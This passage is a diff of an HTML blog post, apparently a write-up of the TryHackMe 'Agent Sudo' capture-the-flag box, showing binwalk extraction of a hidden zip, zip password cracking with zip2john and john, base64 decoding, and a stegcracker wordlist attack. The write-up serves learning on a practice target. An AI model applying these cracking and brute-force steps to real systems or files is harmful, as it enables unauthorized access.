+33143 bytes received in 00:00 (154.69 KiB/s)
+ftp&gt; get cutie.png
+local: cutie.png remote: cutie.png
+229 Entering Extended Passive Mode (|||63920|)
+150 Opening BINARY mode data connection for cutie.png (34842 bytes).
+100% |************| 34842      322.63 KiB/s    00:00 ETA
+226 Transfer complete.
+34842 bytes received in 00:00 (158.37 KiB/s)
+ftp&gt; quit
+221 Goodbye.
+</code></pre><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
 <p>I spent a while viewing the files but don&rsquo;t get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file <a href="https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/">you can do this with binaries, too</a>. Apparently everyone on the internet uses <code>binwalk</code> for this scenario. <a href="https://www.kali.org/tools/binwalk/">Binwalk</a> is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.</p>
 <p>Let&rsquo;s binwalk&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ binwalk cutie.png
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
-</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">0</span>             0x0             PNG image, <span style="color:#1c01ce">528</span> x 528, 8-bit colormap, non-interlaced
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">869</span>           0x365           Zlib compressed data, best compression
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34820</span>         0x8804          End of Zip archive, footer length: <span style="color:#1c01ce">22</span>
-</span></span></code></pre></div><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ binwalk cutie.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</code></pre><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
 <p>We also now have the extracted contents of <code>cutie.png</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">365</span>  365.zlib  8702.zip  To_agentR.txt
-</span></span></code></pre></div><p>Let&rsquo;s unzip the archive:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ 7z x 8702.zip
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>7-Zip <span style="color:#000">[</span>64<span style="color:#000">]</span> 16.02 : Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> 1999-2016 Igor Pavlov : 2016-05-21
-</span></span><span style="display:flex;"><span>p7zip Version 16.02 <span style="color:#000">(</span><span style="color:#000">locale</span><span style="color:#000">=</span>en_US.UTF-8,Utf16<span style="color:#000">=</span>on,HugeFiles<span style="color:#000">=</span>on,64 bits,4 CPUs Intel<span style="color:#000">(</span>R<span style="color:#000">)</span> Core<span style="color:#000">(</span>TM<span style="color:#000">)</span> i7-7700K CPU @ 4.20GHz <span style="color:#000">(</span>906E9<span style="color:#000">)</span>,ASM,AES-NI<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#a90d91">for</span> archives:
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">1</span> file, <span style="color:#1c01ce">280</span> bytes <span style="color:#000">(</span><span style="color:#1c01ce">1</span> KiB<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Extracting archive: 8702.zip
-</span></span><span style="display:flex;"><span>--
-</span></span><span style="display:flex;"><span><span style="color:#000">Path</span> <span style="color:#000">=</span> 8702.zip
-</span></span><span style="display:flex;"><span><span style="color:#000">Type</span> <span style="color:#000">=</span> zip
-</span></span><span style="display:flex;"><span>Physical <span style="color:#000">Size</span> <span style="color:#000">=</span> <span style="color:#1c01ce">280</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>Enter password <span style="color:#000">(</span>will not be echoed<span style="color:#000">)</span>:
-</span></span><span style="display:flex;"><span>ERROR: Wrong password : To_agentR.txt
-</span></span><span style="display:flex;"><span>                    
-</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#1c01ce">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Archives with Errors: <span style="color:#1c01ce">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#1c01ce">1</span>
-</span></span></code></pre></div><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ zip2john 8702.zip &gt; 4john
-</span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">365</span>  365.zlib  4john  8702.zip  To_agentR.txt
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ john 4john
-</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
-</span></span><span style="display:flex;"><span>Loaded <span style="color:#1c01ce">1</span> password <span style="color:#a90d91">hash</span> <span style="color:#000">(</span>ZIP, WinZip <span style="color:#000">[</span>PBKDF2-SHA1 256/256 AVX2 8x<span style="color:#000">])</span>
-</span></span><span style="display:flex;"><span>Cost <span style="color:#1c01ce">1</span> <span style="color:#000">(</span>HMAC size<span style="color:#000">)</span> is <span style="color:#1c01ce">78</span> <span style="color:#a90d91">for</span> all loaded hashes
-</span></span><span style="display:flex;"><span>Will run <span style="color:#1c01ce">4</span> OpenMP threads
-</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
-</span></span><span style="display:flex;"><span>Press <span style="color:#c41a16">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#a90d91">for</span> status
-</span></span><span style="display:flex;"><span>Almost <span style="color:#a90d91">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#a90d91">if</span> any.
-</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
-</span></span><span style="display:flex;"><span>----n            <span style="color:#000">(</span>8702.zip/To_agentR.txt<span style="color:#000">)</span>     
-</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE 2/3 <span style="color:#000">(</span>2022-05-23 11:42<span style="color:#000">)</span> 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
-</span></span><span style="display:flex;"><span>Use the <span style="color:#c41a16">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-</span></span><span style="display:flex;"><span>Session completed. 
-</span></span></code></pre></div><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Agent C,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>We need to send the picture to &#39;-------x&#39; as soon as possible!
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>By,
-</span></span><span style="display:flex;"><span>Agent R
-</span></span></code></pre></div><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ touch -------x.txt
-</span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ vim -------x.txt
-</span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ base64 -d <span style="color:#c41a16">&#39;-------x.txt&#39;</span>
-</span></span><span style="display:flex;"><span>-----1   
-</span></span></code></pre></div><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  8702.zip  To_agentR.txt
+</code></pre><p>Let&rsquo;s unzip the archive:</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ 7z x 8702.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz (906E9),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Enter password (will not be echoed):
+ERROR: Wrong password : To_agentR.txt
+                    
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1
+</code></pre><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ zip2john 8702.zip &gt; 4john
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ ls
+365  365.zlib  4john  8702.zip  To_agentR.txt
+
+──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ john 4john
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+----n            (8702.zip/To_agentR.txt)     
+1g 0:00:00:00 DONE 2/3 (2022-05-23 11:42) 1.587g/s 72174p/s 72174c/s 72174C/s 123456..ferrises
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre><p>It is true. Now we can use <code>----n</code> to access the archive and read the contents of <code>To_agentR.txt</code>.</p>
+<pre tabindex="0"><code>Agent C,
+
+We need to send the picture to &#39;-------x&#39; as soon as possible!
+
+By,
+Agent R
+</code></pre><p>As the result of doing a few CTFs, the name of the picture recipient looks suspiciously like it is encoded in base64. As a reminder: <strong>base64 is not encryption</strong>. This is apparently a <a href="https://twitter.com/sempf/status/988525614444539904">big deal</a> <a href="https://github.com/sethvargo/base64-is-not-encryption">for kubernetes folks</a>.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ touch -------x.txt
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ vim -------x.txt
+                                                                    
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo/_cutie.png.extracted]
+└─$ base64 -d &#39;-------x.txt&#39;
+-----1   
+</code></pre><p>Reading other write-ups after finishing the box, I learned about <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a> which looks great for stuff like this in the future.</p>
 <p>The next prompt on THM asks for the <code>steg password</code>. I don&rsquo;t know what that is, so I search for it and <a href="https://www.kali.org/tools/stegcracker/">stegcracker</a> tops the list. Let&rsquo;s try it, in conjunction with our remaining alien image <code>cute-alien.jpg</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ stegcracker cute-alien.jpg
-</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#000">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> - Luke Paris <span style="color:#000">(</span>Paradoxis<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>StegCracker has been retired following the release of StegSeek, which 
-</span></span><span style="display:flex;"><span><span style="color:#c41a16">&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">StegSeek can be found at: https://github.com/RickdeJager/stegseek
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">No wordlist was specified, using default rockyou.txt wordlist.
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">Counting lines in wordlist..
-</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
-</span></span></span></code></pre></div><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ stegcracker cute-alien.jpg
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2022 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+&#34;steghidewill blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+</code></pre><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
 <p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
 <pre tabindex="0"><code>                                                         
 ┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
